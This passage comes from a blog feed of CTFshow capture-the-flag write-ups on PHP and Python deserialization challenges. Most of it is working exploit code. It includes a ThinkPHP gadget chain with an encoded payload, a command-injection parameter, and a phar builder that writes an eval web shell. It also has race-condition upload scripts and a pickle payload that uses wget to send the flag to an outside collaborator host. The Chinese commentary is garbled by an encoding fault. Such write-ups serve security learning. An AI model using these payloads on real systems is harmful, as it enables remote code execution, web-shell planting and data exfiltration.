punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"var_ajax"</span><span class="token operator">=></span><span class="token string single-quoted-string">'lin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//PHPå‡½æ•°çš„å‚æ•°</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"visible"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">?</span>lin<span class="token operator">=</span>tac <span class="token operator">/</span>flag<span class="token operator">&amp;</span>data<span class="token operator">=</span>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</code></pre><h4 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token operator">=</span><span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'work done'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'where is flag?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>æ²¡ä»”ç»†çœ‹ä¸‹é¢çš„ï¼Œçœ‹åˆ°äº†<code>__destruct</code>å¯ä»¥è°ƒç”¨<code>system</code>æ‰€ä»¥åªéœ€è¦æ»¡è¶³checkevilçš„æ­£åˆ™åŒ¹é…ï¼Œæ‰§è¡Œ<code>system</code>å³å¯</p><p>Payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token keyword">fn</span><span class="token operator">=</span><span class="token operator">|</span><span class="token class-name">tac</span> fla<span class="token operator">*</span><span class="token constant">POST</span><span class="token punctuation">:</span> flag</code></pre><h4 id="web276-Pharååºåˆ—åŒ–"><a href="#web276-Pharååºåˆ—åŒ–" class="headerlink" title="web276(Pharååºåˆ—åŒ–)"></a>web276(Pharååºåˆ—åŒ–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token operator">=</span><span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'work done'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'where is flag?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><code>__destruct()</code>åŠ äº†æ¡ä»¶ï¼Œä½†æ˜¯<code>admin</code>ä¸å¯æ§</p><p><a href="https://xz.aliyun.com/t/2715?time__1311=n4+xni0=G=GQ=DKi==Ds0ffrYGCSDBmiDchrYD">åˆæ¢phar:&#x2F;&#x2F;</a></p><p>é¦–å…ˆæ„é€  <code>phar</code> çš„æ–‡ä»¶ï¼Œå°† <code>filter</code> å­˜å‚¨åœ¨ <code>meta-data</code> ä¸­ä»¥å¤‡ååºåˆ—åŒ–ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a;echo '&lt;?php @eval(\$_POST[1]); ?>' > shell.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"done."</span><span class="token punctuation">;</span></span></code></pre><p>ç„¶åå› ä¸ºæ–‡ä»¶ååŠ ä¸Š <code>/var/www/html/</code> å <code>unlink</code> çš„å‚æ•°å°±ä¼šæœ‰ä¸¤éè·¯å¾„ï¼Œåˆ ä¸æ‰ï¼Œå°±å¯ä»¥æŒä¹…åŒ–ä¸Šä¼ æ–‡ä»¶äº†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡æ¡ä»¶ç«äº‰å»ååºåˆ—åŒ–è¿™ä¸ª <code>phar</code>ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://39afeb37-98e3-49cc-9a59-ba48da61ff09.challenge.ctf.show/"</span>target <span class="token operator">=</span> <span class="token string">"/var/www/html/d.phar"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"CTFshow\php-unserialize\payload.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    payload <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>_ <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/?fn=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token string">"phar://d.phar/test"</span>_ <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/?fn=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><p>æ¡ä»¶ç«äº‰</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl<span class="token operator">=</span><span class="token string">"https://39afeb37-98e3-49cc-9a59-ba48da61ff09.challenge.ctf.show/"</span>f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"CTFshow\php-unserialize\payload.phar"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>content<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#ä¸Šä¼ 1.pharï¼Œå†…å®¹æ˜¯æœ¬åœ°æ–‡ä»¶ï¼šphar.phar</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?fn=d.phar"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œå°è¯•phar://ååºåˆ—åŒ–1.pharï¼Œ1.pharæ²¡è¢«åˆ é™¤å°±èƒ½è¢«ååºåˆ—åŒ–ï¼Œå› è€Œå°±èƒ½æ‰§è¡Œsystem()å‡½æ•°ä»è€Œæ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?fn=phar://d.phar/test"</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token string">"1=system('tac flag.php)"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">or</span> <span class="token string">"flag&#123;"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    t1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>upload<span class="token punctuation">)</span>    t2<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="web277-pythonååºåˆ—åŒ–"><a href="#web277-pythonååºåˆ—åŒ–" class="headerlink" title="web277(pythonååºåˆ—åŒ–)"></a>web277(pythonååºåˆ—åŒ–)</h4><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Python ååºåˆ—åŒ–æ¼æ´</a></p><p>åˆ©ç”¨burpçš„Collaboratorå¤–å¸¦</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">hsad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'wget npgr48shkll6h9ye92srk1po7fd71xpm.oastify.com/?a=`tac flag`'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>hsad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="web277.png" loading="lazy"></p><h4 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h4><p>åŒ <code>web277</code>ï¼Œç¦ç”¨äº† <code>os.system</code> ä½†ä¸å½±å“ <code>os.popen</code>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> php-unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æ”¶é›†</title>
      <link href="/2024/07/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/07/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
